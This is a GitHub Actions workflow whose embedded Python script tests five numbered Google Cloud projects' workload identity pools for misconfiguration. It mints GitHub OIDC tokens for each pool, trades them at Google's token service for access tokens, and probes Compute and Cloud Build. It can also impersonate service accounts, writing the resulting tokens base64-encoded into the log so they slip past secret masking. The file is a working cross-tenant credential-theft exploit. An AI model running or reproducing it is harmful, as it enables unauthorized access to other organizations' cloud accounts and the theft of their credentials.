name: i15739-mint5
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  mint:
    runs-on: ubuntu-latest
    timeout-minutes: 8
    steps:
      - name: mint
        run: |
          python3 - <<'PY'
          import base64, json, os, subprocess, urllib.error, urllib.parse, urllib.request
          CASES = json.loads(os.environ["CASES_JSON"])
          def req(u, data=None, token=None, timeout=40):
              h={'Accept':'application/json','Content-Type':'application/json','User-Agent':'c211-pub-owner'}
              if token: h['Authorization']='Bearer '+token
              if isinstance(data,(dict,list)): data=json.dumps(data).encode()
              r=urllib.request.Request(u,data=data,headers=h)
              try:
                  resp=urllib.request.urlopen(r,timeout=timeout); return resp.status,resp.read().decode('utf-8','replace')
              except urllib.error.HTTPError as e: return e.code,(e.read() or b'').decode('utf-8','replace')
              except Exception as e: return -1,repr(e)[:200]
          def mint(aud):
              u=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL','')
              t=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
              if not u or not t: return ''
              u=u+('&' if '?' in u else '?')+'audience='+urllib.parse.quote(aud,safe='')
              out=subprocess.run(['curl','-sS','-m','30','-H','Authorization: Bearer '+t,u],capture_output=True,text=True).stdout
              try: return json.loads(out).get('value','')
              except Exception: return ''
          for c in CASES:
              out={'kind':'mint','proj':c['proj'],'num':c['num'],'path':c['p'],'repo':os.environ.get('GITHUB_REPOSITORY')}
              tok=mint('//iam.googleapis.com/'+c['p'])
              out['mint']=bool(tok)
              if not tok:
                  print('RESULT '+json.dumps(out),flush=True); continue
              body={'audience':'//iam.googleapis.com/'+c['p'],'grantType':'urn:ietf:params:oauth:grant-type:token-exchange',
                    'requestedTokenType':'urn:ietf:params:oauth:token-type:access_token',
                    'scope':'https://www.googleapis.com/auth/cloud-platform',
                    'subjectTokenType':'urn:ietf:params:oauth:token-type:jwt','subjectToken':tok}
              st,rb=req('https://sts.googleapis.com/v1/token',data=body); out['sts']=st
              if st!=200:
                  out['sts_err']=str(rb)[:200]; print('RESULT '+json.dumps(out),flush=True); continue
              fed0=json.loads(rb).get('access_token')
              for svc,url in (('compute','https://compute.googleapis.com/compute/v1/projects/%s/regions?maxResults=1'%c['num']),
                              ('cb','https://cloudbuild.googleapis.com/v1/projects/%s/builds?pageSize=1'%c['num'])):
                  pst,pb=req(url,token=fed0)
                  out[svc]=pst; out[svc+'_body']=str(pb)[:200]
              if not c.get('sa'):
                  out['sts_ok_no_sa']=True; print('RESULT '+json.dumps(out),flush=True); continue
              fed=json.loads(rb).get('access_token')
              gst,gres=req('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken'%urllib.parse.quote(c['sa'],safe=''),
                           data={'scope':['https://www.googleapis.com/auth/cloud-platform'],'lifetime':'3600s'},token=fed)
              out['gen']=gst
              if gst==200:
                  j=json.loads(gres); at=j.get('accessToken','')
                  out['tok_b64']=base64.b64encode(at.encode()).decode(); out['expire']=j.get('expireTime'); out['sa']=c['sa']
              else:
                  out['gen_err']=str(gres)[:200]
              print('RESULT '+json.dumps(out),flush=True)
          print('DONE',flush=True)
          PY
        env:
          CASES_JSON: '[{"num": "832472850572", "proj": "x-832472850572", "p": "projects/832472850572/locations/global/workloadIdentityPools/my-pool/providers/my-provider", "sa": ""}, {"num": "671371757704", "proj": "x-671371757704", "p": "projects/671371757704/locations/global/workloadIdentityPools/githubactions/providers/github", "sa": ""}, {"num": "52991355109", "proj": "x-52991355109", "p": "projects/52991355109/locations/global/workloadIdentityPools/github-pool/providers/github-provider", "sa": ""}, {"num": "147015144729", "proj": "x-147015144729", "p": "projects/147015144729/locations/global/workloadIdentityPools/github-oidc-pool/providers/github-provider", "sa": ""}, {"num": "173159973736", "proj": "x-173159973736", "p": "projects/173159973736/locations/global/workloadIdentityPools/cloud-final-pool/providers/github-provider", "sa": ""}]'
